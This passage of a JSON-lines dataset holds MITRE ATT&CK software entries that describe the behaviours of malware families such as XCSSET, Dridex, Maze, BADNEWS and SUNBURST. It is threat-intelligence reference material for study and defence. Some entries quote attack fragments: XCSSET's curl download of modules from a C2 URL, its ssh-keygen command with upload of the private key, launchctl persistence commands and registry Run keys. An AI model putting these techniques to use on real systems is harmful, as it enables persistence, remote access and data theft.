system info)</code>.", "XCSSET uses a hidden folder named <code>.xcassets</code> and <code>.git</code> to embed itself in Xcode.", "XCSSET will compress entire <code>~/Desktop</code> folders excluding all <code>.git</code> folders, but only if the total data size is under 200MB.", "XCSSET uses the <code>plutil</code> command to modify the <code>LSUIElement</code>, <code>DFBundleDisplayName</code>, and <code>CFBundleIdentifier</code> keys in the <code>/Contents/Info.plist</code> file.", "XCSSET loads a system level launchdaemon using the <code>launchctl load -w</code> command from <code>/System/Librarby/LaunchDaemons/ssh.plist</code>.", "XCSSET uses a shell script to execute Mach-o files and <code>osacompile</code> commands such as, <code>osacompile -x -o xcode.app main.applescript</code>.", "XCSSET uses the <code>chmod +x</code> command to grant executable permissions to the malicious file.", "XCSSET adds malicious file paths to the <code>DYLD_FRAMEWORK_PATH</code> and <code>DYLD_LIBRARY_PATH</code> environment variables to execute malicious code.", "XCSSET exfiltrates data stolen from a system over its C2 channel.", "XCSSET uses the ssh launchdaemon to elevate privileges, bypass system controls, and enable remote access to the victim.", "XCSSET uses a malicious browser application to replace the legitimate browser in order to continuously capture credentials, monitor web traffic, and download additional modules.", "Using the machine's local time, XCSSET waits 43200 seconds (12 hours) from the initial creation timestamp of a specific file, <code>.report</code>. After the elapsed time, XCSSET executes additional modules.", "XCSSET collects contacts and application data from files in Desktop, Documents, Downloads, Dropbox, and WeChat folders.", "XCSSET builds a malicious application bundle to resemble Safari through using the Safari icon and <code>Info.plist</code>. ", "XCSSET uses <code>ps aux</code> with the <code>grep</code> command to enumerate common browsers and system processes potentially impacting XCSSET's exfiltration capabilities.", "XCSSET will create an ssh key if necessary with the <code>ssh-keygen -t rsa -f $HOME/.ssh/id_rsa -P</code> command. XCSSET will upload a private key file to the server to remotely access the host without a password. ", "XCSSET downloads browser specific AppleScript modules using a constructed URL with the <code>curl</code> command, <code>https://\" & domain & \"/agent/scripts/\" & moduleName & \".applescript</code>.", "XCSSET uses RC4 encryption over TCP to communicate with its C2 server.  ", "XCSSET performs AES-CBC encryption on files under <code>~/Documents</code>, <code>~/Downloads</code>, and\n<code>~/Desktop</code> with a fixed key and renames files to give them a <code>.enc</code> extension. Only files with sizes \nless than 500MB are encrypted.", "XCSSET identifies the macOS version and uses <code>ioreg</code> to determine serial number.", "XCSSET searches firewall configuration files located in <code>/Library/Preferences/</code> and uses <code>csrutil status</code> to determine if System Integrity Protection is enabled."], "is_subtechnique": false}
{"text": " [Hacking Team UEFI Rootkit](https://attack.mitre.org/software/S0047) is a rootkit developed by the company Hacking Team as a method of persistence for remote access software. (Citation: TrendMicro Hacking Team UEFI)", "idx": "https://attack.mitre.org/software/S0047", "title": "Hacking Team UEFI Rootkit", "entity": "Hacking Team UEFI Rootkit", "entity_type": "software", "entity_context": ["Hacking Team UEFI Rootkit is a UEFI BIOS rootkit developed by the company Hacking Team to persist remote access software on some targeted systems.", "Hacking Team UEFI Rootkit is a UEFI BIOS rootkit developed by the company Hacking Team to persist remote access software on some targeted systems. "], "is_subtechnique": false}
{"text": " [Cherry Picker](https://attack.mitre.org/software/S0107) is a point of sale (PoS) memory scraper. (Citation: Trustwave Cherry Picker)", "idx": "https://attack.mitre.org/software/S0107", "title": "Cherry Picker", "entity": "Cherry Picker", "entity_type": "software", "entity_context": ["Recent versions of Cherry Picker delete files and registry keys created by the malware.", "Cherry Picker exfiltrates files over FTP.", "Some variants of Cherry Picker use AppInit_DLLs to achieve persistence by creating the following Registry key: <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows \"AppInit_DLLs\"=\"pserver32.dll\"</code>"], "is_subtechnique": false}
{"text": " [TinyZBot](https://attack.mitre.org/software/S0004) is a bot written in C# that was developed by [Cleaver](https://attack.mitre.org/groups/G0003). (Citation: Cylance Cleaver)", "idx": "https://attack.mitre.org/software/S0004", "title": "TinyZBot", "entity": "TinyZBot", "entity_type": "software", "entity_context": ["TinyZBot can install as a Windows service for persistence.", "TinyZBot contains keylogger functionality.", "TinyZBot supports execution from the command-line.", "TinyZBot contains screen capture functionality.", "TinyZBot can create a shortcut in the Windows startup folder for persistence.", "TinyZBot can disable Avira anti-virus.", "TinyZBot contains functionality to collect information from the clipboard."], "is_subtechnique": false}
{"text": " [Pteranodon](https://attack.mitre.org/software/S0147) is a custom backdoor used by [Gamaredon Group](https://attack.mitre.org/groups/G0047). (Citation: Palo Alto Gamaredon Feb 2017)", "idx": "https://attack.mitre.org/software/S0147", "title": "Pteranodon", "entity": "Pteranodon", "entity_type": "software", "entity_context": ["Pteranodon can download and execute additional files.", "Pteranodon can capture screenshots at a configurable interval.", "Pteranodon schedules tasks to invoke its components in order to establish persistence.", "Pteranodon executes functions using rundll32.exe.", "Pteranodon exfiltrates screenshot files to its C2 server.", "Pteranodon can execute commands on the victim.", "Pteranodon creates various subdirectories under <code>%Temp%\\reports\\%</code> and copies files to those subdirectories. It also creates a folder at <code>C:\\Users\\<Username>\\AppData\\Roaming\\Microsoft\\store</code> to store screenshot JPEG files.", "Pteranodon can delete files that may interfere with it executing. It also can delete temporary files and itself after the initial script executes.", "Pteranodon identifies files matching certain file extension and copies them to subdirectories it created.", "Pteranodon can use HTTP for C2.", "Pteranodon copies itself to the Startup folder to establish persistence."], "is_subtechnique": false}
{"text": " [Dridex](https://attack.mitre.org/software/S0384) is a prolific banking Trojan that first appeared in 2014. By December 2019, the US Treasury estimated [Dridex](https://attack.mitre.org/software/S0384) had infected computers in hundreds of banks and financial institutions in over 40 countries, leading to more than $100 million in theft. [Dridex](https://attack.mitre.org/software/S0384) was created from the source code of the Bugat banking Trojan (also known as Cridex).(Citation: Dell Dridex Oct 2015)(Citation: Kaspersky Dridex May 2017)(Citation: Treasury EvilCorp Dec 2019)", "idx": "https://attack.mitre.org/software/S0384", "title": "Dridex", "entity": "Dridex", "entity_type": "software", "entity_context": ["Dridex's strings are obfuscated using RC4. ", "Dridex has collected the computer name and OS architecture information from the system.", "Dridex contains a module for VNC.", "Dridex can perform browser attacks via web injects to steal information such as credentials, certificates, and cookies.", "Dridex contains a backconnect module for tunneling network traffic through a victim's computer. Infected computers become part of a P2P botnet that can relay C2 traffic to other infected peers. ", "Dridex has encrypted traffic with RSA.", "Dridex can use multiple layers of proxy servers to hide terminal nodes in its infrastructure.", "Dridex has used the <code>OutputDebugStringW</code> function to avoid malware analysis as part of its anti-debugging technique. ", "Dridex has encrypted traffic with RC4.", "Dridex has used POST requests and HTTPS for C2 communications.", "Dridex has relied upon users clicking on a malicious attachment delivered through spearphishing.", "Dridex has collected a list of installed software on the system."], "is_subtechnique": false}
{"text": " [Maze](https://attack.mitre.org/software/S0449) ransomware, previously known as \"ChaCha\", was discovered in May 2019. In addition to encrypting files on victim machines for impact, [Maze](https://attack.mitre.org/software/S0449) operators conduct information stealing campaigns prior to encryption and post the information online to extort affected companies.(Citation: FireEye Maze May 2020)(Citation: McAfee Maze March 2020)(Citation: Sophos Maze VM September 2020)", "idx": "https://attack.mitre.org/software/S0449", "title": "Maze", "entity": "Maze", "entity_type": "software", "entity_context": ["Maze has created a file named \"startup_vrun.bat\" in the Startup folder of a virtual machine to establish persistence.", "Maze has used the “Wow64RevertWow64FsRedirection” function following attempts to delete the shadow volumes, in order to leave the system in the same state as it was prior to redirection.\t", "The Maze encryption process has used batch scripts with various commands.", "Maze has gathered all of the running system processes.\t", "Maze has communicated to hard-coded IP addresses via HTTP.", "Maze has attempted to delete the shadow volumes of infected machines, once before and once after the encryption process.", "Maze operators have created scheduled tasks masquerading as \"Windows Update Security\", \"Windows Update Security Patches\", and \"Google Chrome Security Update\" designed to launch the ransomware. ", "Maze has used WMI to attempt to delete the shadow volumes on a machine, and to connect a virtual machine to the network domain of the victim organization's network. ", "Maze has forged POST strings with a random choice from a list of possibilities including \"forum\", \"php\", \"view\", etc. while making connection with the C2, hindering detection efforts.", "Maze has disabled dynamic analysis and other security tools including IDA debugger, x32dbg, and OllyDbg. It has also disabled Windows Defender's Real-Time Monitoring feature and attempted to disable endpoint protection services.", "Maze has used several Windows API functions throughout the encryption process including IsDebuggerPresent, TerminateProcess, Process32FirstW, among others.\t", "Maze has created scheduled tasks using name variants such as \"Windows Update Security\", \"Windows Update Security Patches\", and \"Google Chrome Security Update\", to launch Maze at a specific time.", "Maze has disrupted systems by encrypting files on targeted machines, claiming to decrypt files if a ransom payment is made. Maze has used the ChaCha algorithm, based on Salsa20, and an RSA algorithm to encrypt files.", "Maze has delivered components for its ransomware attacks using MSI files, some of which have been executed from the command-line using <code>msiexec</code>.", "Maze has decrypted strings and other important information during the encryption process. Maze also calls certain functions dynamically to hinder analysis.\t", "Maze has used the \"WNetOpenEnumW\", \"WNetEnumResourceW”, “WNetCloseEnum” and “WNetAddConnection2W” functions to enumerate the network resources on the infected machine.", "Maze operators have used VirtualBox and a Windows 7 virtual machine to run the ransomware; the virtual machine's configuration file mapped the shared network drives of the target company, presumably so Maze can encrypt files on the shared drives as well as the local machine. ", "Maze has inserted large blocks of junk code, including some components to decrypt strings and other important information for later in the encryption process.", "Maze has stopped SQL services to ensure it can encrypt any database. ", "Maze has checked the language of the infected system using the \"GetUSerDefaultUILanguage\" function.", "Maze has checked the language of the machine with function <code>GetUserDefaultUILanguage</code> and terminated execution if the language matches with an entry in the predefined list.", "Maze has injected the malware DLL into a target process.\t", "Maze has issued a shutdown command on a victim machine that, upon reboot, will run the ransomware within a VM."], "is_subtechnique": false}
{"text": " [BADNEWS](https://attack.mitre.org/software/S0128) is malware that has been used by the actors responsible for the [Patchwork](https://attack.mitre.org/groups/G0040) campaign. Its name was given due to its use of RSS feeds, forums, and blogs for command and control. (Citation: Forcepoint Monsoon) (Citation: TrendMicro Patchwork Dec 2017)", "idx": "https://attack.mitre.org/software/S0128", "title": "BADNEWS", "entity": "BADNEWS", "entity_type": "software", "entity_context": ["BADNEWS has a command to download an .exe and use process hollowing to inject it into a new process.", "When it first starts, BADNEWS crawls the victim's local drives and collects documents with the following extensions: .doc, .docx, .pdf, .ppt, .pptx, and .txt.", "BADNEWS encrypts C2 data with a ROR by 3 and an XOR by 0x23.", "BADNEWS can use multiple C2 channels, including RSS feeds, Github, forums, and blogs.", "BADNEWS copies documents under 15MB found on the victim system to is the user's <code>%temp%\\SMB\\</code> folder. It also copies files from USB devices to a predefined directory.", "BADNEWS typically loads its DLL file into a legitimate signed Java or VMware executable.", "BADNEWS is capable of downloading additional files through C2 channels, including a new version of itself.", "When it first starts, BADNEWS spawns a new thread to log keystrokes.", "BADNEWS is sometimes signed with an invalid Authenticode certificate in an apparent effort to make it look more legitimate.", "After encrypting C2 data, BADNEWS converts it into a hexadecimal representation and then encodes it into base64.", "BADNEWS has a command to take a screenshot and send it to the C2 server.", "BADNEWS establishes a backdoor over HTTP.", "BADNEWS creates a scheduled task to establish by executing a malicious payload every subsequent minute.", "When it first starts, BADNEWS crawls the victim's mapped drives and collects documents with the following extensions: .doc, .docx, .pdf, .ppt, .pptx, and .txt.", "BADNEWS attempts to hide its payloads using legitimate filenames.", "BADNEWS copies files with certain extensions from USB devices to\na predefined directory.", "BADNEWS installs a registry Run key to establish persistence.", "BADNEWS is capable of executing commands via cmd.exe.", "BADNEWS encodes C2 traffic with base64.", "BADNEWS has a command to download an .exe and execute it via CreateProcess API. It can also run with ShellExecute.", "BADNEWS identifies files with certain extensions from USB devices, then copies them to a predefined directory.", "BADNEWS monitors USB devices and copies files with certain extensions to a predefined directory.", "BADNEWS collects C2 information via a dead drop resolver.", "BADNEWS checks for new hard drives on the victim, such as USB devices, by listening for the WM_DEVICECHANGE window message."], "is_subtechnique": false}
{"text": " [IronNetInjector](https://attack.mitre.org/software/S0581) is a [Turla](https://attack.mitre.org/groups/G0010) toolchain that utilizes scripts from the open-source IronPython implementation of Python with a .NET injector to drop one or more payloads including [ComRAT](https://attack.mitre.org/software/S0126).(Citation: Unit 42 IronNetInjector February 2021 )", "idx": "https://attack.mitre.org/software/S0581", "title": "IronNetInjector", "entity": "IronNetInjector", "entity_type": "software", "entity_context": ["IronNetInjector can identify processes via C# methods such as <code>GetProcessesByName</code> and running Tasklist with the Python <code>os.popen</code> function.", "IronNetInjector can use an IronPython scripts to load a .NET injector to inject a payload into its own or a remote process.", "IronNetInjector has used a task XML file named <code>mssch.xml</code> to run an IronPython script when a user logs in or when specific system events are created.", "IronNetInjector can obfuscate variable names, encrypt strings, as well as base64 encode and Rijndael encrypt payloads.", "IronNetInjector has been disguised as a legitimate service using the name PythonUpdateSrvc.", "IronNetInjector can use IronPython scripts to load payloads with the help of a .NET injector.", "IronNetInjector has the ability to inject a DLL into running processes, including the IronNetInjector DLL into explorer.exe.", "IronNetInjector has the ability to decrypt embedded .NET and PE payloads."], "is_subtechnique": false}
{"text": " [Forfiles](https://attack.mitre.org/software/S0193) is a Windows utility commonly used in batch jobs to execute commands on one or more selected files or directories (ex: list all directories in a drive, read the first line of all files created yesterday, etc.). Forfiles can be executed from either the command line, Run window, or batch files/scripts. (Citation: Microsoft Forfiles Aug 2016)", "idx": "https://attack.mitre.org/software/S0193", "title": "Forfiles", "entity": "Forfiles", "entity_type": "software", "entity_context": ["Forfiles can be used to locate certain types of files/directories in a system.(ex: locate all files with a specific extension, name, and/or age)", "Forfiles can be used to subvert controls and possibly conceal command execution by not directly invoking cmd.", "Forfiles can be used to act on (ex: copy, move, etc.) files/directories in a system during (ex: copy files into a staging area before)."], "is_subtechnique": false}
{"text": " [Starloader](https://attack.mitre.org/software/S0188) is a loader component that has been observed loading [Felismus](https://attack.mitre.org/software/S0171) and associated tools. (Citation: Symantec Sowbug Nov 2017)", "idx": "https://attack.mitre.org/software/S0188", "title": "Starloader", "entity": "Starloader", "entity_type": "software", "entity_context": ["Starloader has masqueraded as legitimate software update packages such as Adobe Acrobat Reader and Intel.", "Starloader decrypts and executes shellcode from a file called Stars.jps."], "is_subtechnique": false}
{"text": " [MESSAGETAP](https://attack.mitre.org/software/S0443) is a data mining malware family deployed by [APT41](https://attack.mitre.org/groups/G0096) into telecommunications networks to monitor and save SMS traffic from specific phone numbers, IMSI numbers, or that contain specific keywords. (Citation: FireEye MESSAGETAP October 2019)", "idx": "https://attack.mitre.org/software/S0443", "title": "MESSAGETAP", "entity": "MESSAGETAP", "entity_type": "software", "entity_context": ["MESSAGETAP stored targeted SMS messages that matched its target list in CSV files on the compromised system.", "After loading the keyword and phone data files, MESSAGETAP begins monitoring all network connections to and from the victim server. ", "MESSAGETAP checks for the existence of two configuration files (keyword_parm.txt and parm.txt) and attempts to read the files every 30 seconds.", "After checking for the existence of two files, keyword_parm.txt and parm.txt, MESSAGETAP XOR decodes and read the contents of the files. ", "MESSAGETAP checks two files, keyword_parm.txt and parm.txt, for instructions on how to target and save data parsed and extracted from SMS message data from the network traffic. If an SMS message contained either a phone number, IMSI number, or keyword that matched the predefined list, it is saved to a CSV file for later theft by the threat actor.", "MESSAGETAP has XOR-encrypted and stored contents of SMS messages that matched its target list. ", "Once loaded into memory, MESSAGETAP deletes the keyword_parm.txt and parm.txt configuration files from disk. ", "MESSAGETAP uses the libpcap library to listen to all traffic and parses network protocols starting with Ethernet and IP layers. It continues parsing protocol layers including SCTP, SCCP, and TCAP and finally extracts SMS message data and routing metadata.  "], "is_subtechnique": false}
{"text": " [WINDSHIELD](https://attack.mitre.org/software/S0155) is a signature backdoor used by [APT32](https://attack.mitre.org/groups/G0050). (Citation: FireEye APT32 May 2017)", "idx": "https://attack.mitre.org/software/S0155", "title": "WINDSHIELD", "entity": "WINDSHIELD", "entity_type": "software", "entity_context": ["WINDSHIELD can gather the victim computer name.", "WINDSHIELD can gather Registry values.", "WINDSHIELD C2 traffic can communicate via TCP raw sockets.", "WINDSHIELD is capable of file deletion along with other file system interaction.", "WINDSHIELD can gather the victim user name."], "is_subtechnique": false}
{"text": " [Wevtutil](https://attack.mitre.org/software/S0645) is a Windows command-line utility that enables administrators to retrieve information about event logs and publishers.(Citation: Wevtutil Microsoft Documentation)", "idx": "https://attack.mitre.org/software/S0645", "title": "Wevtutil", "entity": "Wevtutil", "entity_type": "software", "entity_context": ["Wevtutil can be used to clear system and security event logs from the system.", "Wevtutil can be used to disable specific event logs on the system.", "Wevtutil can be used to export events from a specific log."], "is_subtechnique": false}
{"text": " [StreamEx](https://attack.mitre.org/software/S0142) is a malware family that has been used by [Deep Panda](https://attack.mitre.org/groups/G0009) since at least 2015. In 2016, it was distributed via legitimate compromised Korean websites. (Citation: Cylance Shell Crew Feb 2017)", "idx": "https://attack.mitre.org/software/S0142", "title": "StreamEx", "entity": "StreamEx", "entity_type": "software", "entity_context": ["StreamEx has the ability to modify the Registry.", "StreamEx has the ability to enumerate processes.", "StreamEx has the ability to scan for security tools such as firewalls and antivirus tools.", "StreamEx has the ability to enumerate drive types.", "StreamEx establishes persistence by installing a new service pointing to its DLL and setting the service to auto-start.", "StreamEx uses rundll32 to call an exported function.", "StreamEx obfuscates some commands by using statically programmed fragments of strings when starting a DLL. It also uses a one-byte xor against 0x91 to encode configuration data.", "StreamEx has the ability to remotely execute commands.", "StreamEx has the ability to enumerate system information."], "is_subtechnique": false}
{"text": " [BBK](https://attack.mitre.org/software/S0470) is a downloader that has been used by [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) since at least 2019.(Citation: Trend Micro Tick November 2019)", "idx": "https://attack.mitre.org/software/S0470", "title": "BBK", "entity": "BBK", "entity_type": "software", "entity_context": ["BBK has the ability to use HTTP in communications with C2.", "BBK has the ability to decrypt AES encrypted payloads.", "BBK can extract a malicious Portable Executable (PE) from a photo.", "BBK has the ability to download files from C2 to the infected host.", "BBK has the ability to inject shellcode into svchost.exe.", "BBK has the ability to use cmd to run a Portable Executable (PE) on the compromised host.", "BBK has the ability to use the <code>CreatePipe</code> API to add a sub-process for execution via cmd."], "is_subtechnique": false}
{"text": " [NetTraveler](https://attack.mitre.org/software/S0033) is malware that has been used in multiple cyber espionage campaigns for basic surveillance of victims. The earliest known samples have timestamps back to 2005, and the largest number of observed samples were created between 2010 and 2013. (Citation: Kaspersky NetTraveler)", "idx": "https://attack.mitre.org/software/S0033", "title": "NetTraveler", "entity": "NetTraveler", "entity_type": "software", "entity_context": ["NetTraveler contains a keylogger.", "NetTraveler reports window names along with keylogger information to provide application context."], "is_subtechnique": false}
{"text": " [Komplex](https://attack.mitre.org/software/S0162) is a backdoor that has been used by [APT28](https://attack.mitre.org/groups/G0007) on OS X and appears to be developed in a similar manner to [XAgentOSX](https://attack.mitre.org/software/S0161) (Citation: XAgentOSX 2017) (Citation: Sofacy Komplex Trojan).", "idx": "https://attack.mitre.org/software/S0162", "title": "Komplex", "entity": "Komplex", "entity_type": "software", "entity_context": ["The Komplex payload is stored in a hidden directory at <code>/Users/Shared/.local/kextd</code>.", "The OsInfo function in Komplex collects the current running username.", " The Komplex trojan creates a persistent launch agent called with <code>$HOME/Library/LaunchAgents/com.apple.updates.plist</code> with <code>launchctl load -w ~/Library/LaunchAgents/com.apple.updates.plist</code>.", "The Komplex C2 channel uses HTTP POST requests.", "The OsInfo function in Komplex collects a running process list.", "The Komplex C2 channel uses an 11-byte XOR algorithm to hide data.", "The Komplex trojan supports file deletion."], "is_subtechnique": false}
{"text": " [Rifdoor](https://attack.mitre.org/software/S0433) is a remote access trojan (RAT) that shares numerous code similarities with [HotCroissant](https://attack.mitre.org/software/S0431).(Citation: Carbon Black HotCroissant April 2020)", "idx": "https://attack.mitre.org/software/S0433", "title": "Rifdoor", "entity": "Rifdoor", "entity_type": "software", "entity_context": ["Rifdoor has the ability to identify the IP address of the compromised host.", "Rifdoor has the ability to identify the Windows version on the compromised host.", "Rifdoor has created a new registry entry at <code>HKEY_CURRENT_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Graphics</code> with a value of <code>C:\\ProgramData\\Initech\\Initech.exe /run</code>.", "Rifdoor has the ability to identify the username on the compromised host.", "Rifdoor has been executed from malicious Excel or Word documents containing macros.", "Rifdoor has encrypted strings with a single byte XOR algorithm.", "Rifdoor has encrypted command and control (C2) communications with a stream cipher.", "Rifdoor has added four additional bytes of data upon launching, then saved the changed version as <code>C:\\ProgramData\\Initech\\Initech.exe</code>.", "Rifdoor has been distributed in e-mails with malicious Excel or Word documents."], "is_subtechnique": false}
{"text": " [httpclient](https://attack.mitre.org/software/S0068) is malware used by [Putter Panda](https://attack.mitre.org/groups/G0024). It is a simple tool that provides a limited range of functionality, suggesting it is likely used as a second-stage or supplementary/backup tool. (Citation: CrowdStrike Putter Panda)", "idx": "https://attack.mitre.org/software/S0068", "title": "httpclient", "entity": "httpclient", "entity_type": "software", "entity_context": ["httpclient opens cmd.exe on the victim.", "httpclient uses HTTP for command and control.", "httpclient encrypts C2 content with XOR using a single byte, 0x12."], "is_subtechnique": false}
{"text": " [Melcoz](https://attack.mitre.org/software/S0530) is a banking trojan family built from the open source tool Remote Access PC. [Melcoz](https://attack.mitre.org/software/S0530) was first observed in attacks in Brazil and since 2018 has spread to Chile, Mexico, Spain, and Portugal.(Citation: Securelist Brazilian Banking Malware July 2020)", "idx": "https://attack.mitre.org/software/S0530", "title": "Melcoz", "entity": "Melcoz", "entity_type": "software", "entity_context": ["Melcoz can use VBS scripts to execute malicious DLLs.", "Melcoz has been distributed through an AutoIt loader script.", "Melcoz has the ability to download additional files to a compromised host.", "Melcoz has gained execution through victims opening malicious links.", "Melcoz can monitor the victim's browser for online banking sessions and display an overlay window to manipulate the session in the background.", "Melcoz can monitor content saved to the clipboard.", "Melcoz can monitor the clipboard for cryptocurrency addresses and change the intended address to one controlled by the adversary.", "Melcoz can use MSI files with embedded VBScript for execution.", "Melcoz has the ability to steal credentials from web browsers.", "Melcoz has been spread through malicious links embedded in e-mails.", "Melcoz can use DLL hijacking to bypass security controls.", "Melcoz has been packed with VMProtect and Themida."], "is_subtechnique": false}
{"text": " [Expand](https://attack.mitre.org/software/S0361) is a Windows utility used to expand one or more compressed CAB files.(Citation: Microsoft Expand Utility) It has been used by [BBSRAT](https://attack.mitre.org/software/S0127) to decompress a CAB file into executable content.(Citation: Palo Alto Networks BBSRAT)", "idx": "https://attack.mitre.org/software/S0361", "title": "Expand", "entity": "Expand", "entity_type": "software", "entity_context": ["Expand can be used to decompress a local or remote CAB file into an executable.", "Expand can be used to download or copy a file into an alternate data stream.", "Expand can be used to download or upload a file over a network share."], "is_subtechnique": false}
{"text": " [ROCKBOOT](https://attack.mitre.org/software/S0112) is a [Bootkit](https://attack.mitre.org/techniques/T1542/003) that has been used by an unidentified, suspected China-based group. (Citation: FireEye Bootkits)", "idx": "https://attack.mitre.org/software/S0112", "title": "ROCKBOOT", "entity": "ROCKBOOT", "entity_type": "software", "entity_context": ["ROCKBOOT is a Master Boot Record (MBR) bootkit that uses the MBR to establish persistence."], "is_subtechnique": false}
{"text": " [Bankshot](https://attack.mitre.org/software/S0239) is a remote access tool (RAT) that was first reported by the Department of Homeland Security in December of 2017. In 2018, [Lazarus Group](https://attack.mitre.org/groups/G0032) used the [Bankshot](https://attack.mitre.org/software/S0239) implant in attacks against the Turkish financial sector. (Citation: McAfee Bankshot)", "idx": "https://attack.mitre.org/software/S0239", "title": "Bankshot", "entity": "Bankshot", "entity_type": "software", "entity_context": ["Bankshot can terminate a specific process by its process id.", "Bankshot deletes all artifacts associated with the malware from the infected machine.", "Bankshot leverages a known zero-day vulnerability in Adobe Flash to execute the implant into the victims’ machines.", "Bankshot uploads files and secondary payloads to the victim's machine.", "Bankshot identifies processes and collects the process ids.", "Bankshot exfiltrates data over its C2 channel.", "Bankshot writes data into the Registry key <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Pniumj</code>.", "Bankshot gathers domain and account names/information through process monitoring.", "Bankshot searches for certain Registry keys to be configured before executing the payload.", "Bankshot grabs a user token using WTSQueryUserToken and then creates a process by impersonating a logged-on user.", "Bankshot uses the command-line interface to execute arbitrary commands.", "Bankshot modifies the time of a file as specified by the control server.", "Bankshot encodes commands from the control server using a range of characters and gzip.", "Bankshot creates processes using the Windows API calls: CreateProcessA() and CreateProcessAsUserA().", "Bankshot generates a false TLS handshake using a public certificate to disguise C2 network communications.", "Bankshot marks files to be deleted upon the next system reboot and uninstalls and removes itself from the system.", "Bankshot decodes embedded XOR strings.", "Bankshot collects files from the local system.", "Bankshot uses HTTP for command and control communication.", "Bankshot gathers system information, network addresses, disk type, disk free space, and the operation system version.", "Bankshot recursively generates a list of files within a directory and sends them back to the control server.", "Bankshot binds and listens on port 1058 for HTTP traffic while also utilizing a FakeTLS method.", "Bankshot searches for files on the victim's machine."], "is_subtechnique": false}
{"text": " [Bandook](https://attack.mitre.org/software/S0234) is a commercially available RAT, written in Delphi and C++, that has been available since at least 2007. It has been used against government, financial, energy, healthcare, education, IT, and legal organizations in the US, South America, Europe, and Southeast Asia. [Bandook](https://attack.mitre.org/software/S0234) has been used by [Dark Caracal](https://attack.mitre.org/groups/G0070), as well as in a separate campaign referred to as \"Operation Manul\".(Citation: EFF Manul Aug 2016)(Citation: Lookout Dark Caracal Jan 2018)(Citation: CheckPoint Bandook Nov 2020)", "idx": "https://attack.mitre.org/software/S0234", "title": "Bandook", "entity": "Bandook", "entity_type": "software", "entity_context": ["Bandook can download files to the system.", "Bandook can collect local files from the system . ", "Bandook is delivered via a malicious Word document inside a zip file.", "Bandook has a command built in to use a raw TCP socket. ", "Bandook has used lure documents to convince the user to enable macros. ", "Bandook is capable of taking an image of and uploading the current desktop.", "Bandook has used the ShellExecuteW() function call. ", "Bandook has decoded its PowerShell script.", "Bandook has a command to get the public IP address from a system. ", "Bandook has used AES encryption for C2 communication.", "Bandook can detect USB devices.", "Bandook has used malicious VBA code against the target system.", "Bandook has a command to list files on a system.", "Bandook can support commands to execute Python-based payloads.", "Bandook can support commands to execute Java-based payloads. ", "Bandook has been launched by starting iexplore.exe and replacing it with Bandook's payload.", "Bandook can collect information about the drives available on the system. ", "Bandook has modules that are capable of capturing audio.", "Bandook has modules that are capable of capturing video from a victim's webcam.", "Bandook has used PowerShell loaders as part of execution.", "Bandook has used .PNG images within a zip file to build the executable. ", "Bandook contains keylogging capabilities.", "Bandook is capable of spawning a Windows command shell.", "Bandook was signed with valid Certum certificates. ", "Bandook has a command to delete a file.", "Bandook can upload files from a victim's machine over the C2 channel."], "is_subtechnique": false}
{"text": " [HIDEDRV](https://attack.mitre.org/software/S0135) is a rootkit used by [APT28](https://attack.mitre.org/groups/G0007). It has been deployed along with [Downdelph](https://attack.mitre.org/software/S0134) to execute and hide that malware. (Citation: ESET Sednit Part 3) (Citation: Sekoia HideDRV Oct 2016)", "idx": "https://attack.mitre.org/software/S0135", "title": "HIDEDRV", "entity": "HIDEDRV", "entity_type": "software", "entity_context": ["HIDEDRV injects a DLL for Downdelph into the explorer.exe process.", "HIDEDRV is a rootkit that hides certain operating system artifacts."], "is_subtechnique": false}
{"text": " [SUNBURST](https://attack.mitre.org/software/S0559) is a trojanized DLL designed to fit within the SolarWinds Orion software update framework. It was used by [APT29](https://attack.mitre.org/groups/G0016) since at least February 2020.(Citation: SolarWinds Sunburst Sunspot Update January 2021)(Citation: Microsoft Deep Dive Solorigate January 2021)", "idx": "https://attack.mitre.org/software/S0559", "title": "SUNBURST", "entity": "SUNBURST", "entity_type": "software", "entity_context": ["SUNBURST delivered different payloads, including TEARDROP in at least one instance.", "SUNBURST had a command to delete files.", "SUNBURST collected information from a compromised host.", "SUNBURST collected all network interface MAC addresses that are up and not loopback devices, as well as IP address, DHCP configuration, and domain information.", "SUNBURST attempted to disable software security services following checks against a FNV-1a + XOR hashed hardcoded blocklist.", "SUNBURST collected the username from a compromised host.", "SUNBURST used DNS for C2 traffic designed to mimic normal SolarWinds API communications.", "SUNBURST collected a list of process names that were hashed using a FNV-1a + XOR algorithm to check against similarly-hashed hardcoded blocklists.", "SUNBURST checked for a variety of antivirus/endpoint detection agents prior to execution.", "SUNBURST removed IFEO values to clean up traces of execution.", "SUNBURST collected hostname, OS version, and device uptime.", "SUNBURST C2 data attempted to appear as benign XML related to .NET assemblies or as a faux JSON blob.", "SUNBURST created VBScripts that were named after existing services or folders to blend into legitimate activities. ", "SUNBURST masqueraded its network traffic as the Orion Improvement Program (OIP) protocol.", "SUNBURST checked the domain name of the compromised host to verify it was running in a real environment.", "SUNBURST collected the registry value <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid</code> from compromised hosts.", "SUNBURST had commands to enumerate files and directories.", "SUNBURST strings were compressed and encoded in Base64. SUNBURST also obfuscated collected system information using a FNV-1a + XOR algorithm.", "SUNBURST used the WMI query <code>Select * From Win32_SystemDriver</code> to retrieve a driver listing.", "SUNBURST was digitally signed by SolarWinds from March - May 2020.", "SUNBURST used VBScripts to initiate the execution of payloads.", "SUNBURST source code used generic variable names and pre-obfuscated strings, and was likely sanitized of developer comments before being added to SUNSPOT. ", "SUNBURST added junk bytes to its C2 over HTTP.", "SUNBURST dynamically resolved C2 infrastructure for randomly-generated subdomains within a parent domain.", "SUNBURST used Base64 encoding in its C2 traffic.", "SUNBURST encrypted C2 traffic using a single-byte-XOR cipher.", "SUNBURST remained dormant after initial access for a period of up to two weeks.", "SUNBURST communicated via HTTP GET or HTTP POST requests to third party servers for C2.", "SUNBURST used Rundll32 to execute payloads. ", "SUNBURST collected a list of service names that were hashed using a FNV-1a + XOR algorithm to check against similarly-hashed hardcoded blocklists.", "SUNBURST created an Image File Execution Options (IFEO) Debugger registry value for the process <code>dllhost.exe</code> to trigger the installation of Cobalt Strike.", "SUNBURST had commands that allow an attacker to write or delete registry keys, and was observed stopping services by setting their <code>HKLM\\SYSTEM\\CurrentControlSet\\services\\\\service_name\\\\Start</code> registry entries to value 4. It also deleted 